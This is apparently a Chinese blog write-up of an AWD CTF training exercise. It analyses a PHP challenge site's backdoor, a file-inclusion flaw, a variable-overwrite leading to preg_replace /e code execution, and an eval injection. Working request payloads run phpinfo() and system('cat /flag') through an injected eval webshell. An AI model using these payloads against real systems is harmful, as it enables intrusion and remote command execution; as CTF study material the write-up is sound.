---
title: awd训练(一)
date: 2022-07-08 20:52:04
tags:
    - awd
categories:
          - [awd]
---

一次awd训练，训练一下

<!--more-->

拿到站点之后是这样的站



![image-20220708185624801](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207081903106.png?x-oss-process=hzy)

与此同时上D盾

![image-20220708185949509](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207081859588.png?x-oss-process=hzy)

*有一个*eval函数，说简单就是i有个一句话木马，纯纯拼手速的了

，通过这用蚁剑连上自己，然后把后门删掉

![image-20220708190147410](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207081901467.png?x-oss-process=hzy)

这里我看删不掉我就把后门的参数改了，相信改了之后应该也不会被利用了（当然，用其他漏洞还是能看到的，所以一定要防的完善点）

继续看下一个漏洞

看一下action.php这个文件

```
<?php
require_once("library/common.php"); 
require_once("library/view.php");  // 包含这俩路径的文件
$page = filter($_POST['page']).'.php'; //使用file函数过滤用户输入的内容
$post_data = array();
foreach ($_POST as $key => $value) {
	$post_data[$key] = $value;
}
if (file_exists($page))
{
	@require_once($page);
}
?>
```

这个page参数是可控的，但是同时也需要注意这段代码

```
function filter($input)
{
	return str_replace('.', '', $input);
```

输入的参数中的.都会被替换成空格，所以在传参的同时应该注意不要使用.,这也就是说明我们不能使用相对路径了，而应该使用绝对路径来包含。

尝试将代码写入到logfile.php中，原因如下：

```
function write_log($input) // 写入的参数执行这个方法
{
	global $cfg_logfile;   // 定义这个变量
    file_put_contents($cfg_logfile, $input, FILE_APPEND); 
} 
// 这个write_log函数可以将传入的数据写入到日志里
```

> PHP file_put_contents() 函数
>
> ![image-20220708193345437](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207081933496.png?x-oss-process=hzy)
>
> **提示：**使用 FILE_APPEND 可避免删除文件中已有的内容。

再看下面这段代码

```
function loadFile($filePath)
{
	global $cfg_basedir;
	if(!file_exists($filePath)){
		write_log('Try to open Null file:'.$filePath);
		return file_get_contents($cfg_basedir.'/error.php'); // 当访问的页面不存在时直接写入内容为文件路径
	}
```

接下来试一下这个文件包含利用，上面说了如果访问的页面不存在就会直接写入内容

![image-20220708194027642](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207081940779.png?x-oss-process=hzy)

出现报错了，这个情况下应该也是写进去了，上面也提到了，是写到了logfile.php这个文件里面，访问一下，发现是不允许的，应该是权限不够

![image-20220708194210231](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207081942292.png?x-oss-process=hzy)



那我们试试能不能包含出来这个文件

![image-20220708195830102](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207081958181.png?x-oss-process=hzy)

成功包含

再来看下一个漏洞

首先科普一下preg_replace函数

![image-20220708200551051](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207082005117.png?x-oss-process=hzy)

然后看这段代码

```
function action($post_data, $ip_replacement, $mail_replacement){
	foreach ($post_data as $key => $value) {
		$$key = $value;
	}
	try{
		if ($method == '/\\d+\\.\\d+\\.\\d+\\.\\d+/')
		{
			$res = preg_replace($method, $ip_replacement, $source);
		}
		else
		{
			$res = preg_replace($method, $mail_replacement, $source);  //正则命令执行，上面给了这个函数的语法
		}

	}
	catch(Exception $e)
	{
		write_log($e->getMessage());
		$res=$source;
	}
	return $res;
}
$view_class = new View();
$data = array();
$data['page'] = 'normaliz';
$ip_replacement = '222.222.222.222';
$mail_replacement = 'lollol@lol.com';
$data['res'] = action($post_data, $ip_replacement, $mail_replacement);
$view_class->echoContent($data['page'], $data);// 在这些变量里只有post_data是活的，其他都被写死了，所有就需要控制这个函数来进行执行函数
```

这个时候可以通过action.php进行文件包含使其变量覆盖

```
<?php
require_once("library/common.php");
require_once("library/view.php");
$page = filter($_POST['page']).'.php';
$post_data = array();
foreach ($_POST as $key => $value) {
	$post_data[$key] = $value;
}
if (file_exists($page))
{
	@require_once($page);
}
?>

下面这部分是normaliz.php的代码，联合起来看
function action($post_data, $ip_replacement, $mail_replacement){
	foreach ($post_data as $key => $value) {
		$$key = $value;
```

不是要替换吗，那就替换个命令看看会不会执行

```
page=normaliz&res=&method=/b/e&mail_replacement=phpinfo()&source=b;
// preg_replace("/b/e", "phpinfo()", "b");
//  preg_replace中的正则加了e的选项就会把正则式替换的部分替换之后的内容执行一下啊，然后将执行完的结果放进需要被替换的位置
```

![image-20220708201556889](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207082015984.png?x-oss-process=hzy)

执行成功

下一个漏洞就不是文件包含了，还有个命令执行漏洞

eval函数，yyds

```
for($elseIfLen=1;$elseIfLen<$elseIfaryLen;$elseIfLen++){
					$strElseIf=$this->parseStrIf($strElseIf);
					@eval("if(".$strElseIf."){\$resultStr=\"$strElseIfThen\";}");
					@eval("if(".$strElseIf."){\$elseIfstatus=true;}else{\$elseIfstatus=false;}");
```



```
<?php
require_once("library/common.php");
require_once("library/view.php"); // md5文件包含了view.php，而且这也有变量覆盖，res可以控制strElseIf，这就是触发点
function action($post_data){
	foreach ($post_data as $key => $value) {
		$$key = $value;
	}
	if ($method==='md5'){
		$res = md5($source);
	}
	if ($method==='sha1'){
		$res = sha1($source);
	}
	return $res;
}
$view_class = new View();
$data = array();
$data['page'] = 'md5';
$data['res'] = action($post_data);
$view_class->echoContent($data['page'], $data);
?>
```

```
page=md5&res="or @eval($_POST[123])or"&123=system('cat /flag');
```

![image-20220708203400038](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207082034121.png?x-oss-process=hzy)

至此就找到这些漏洞，应该也有其他漏洞，就不找了.

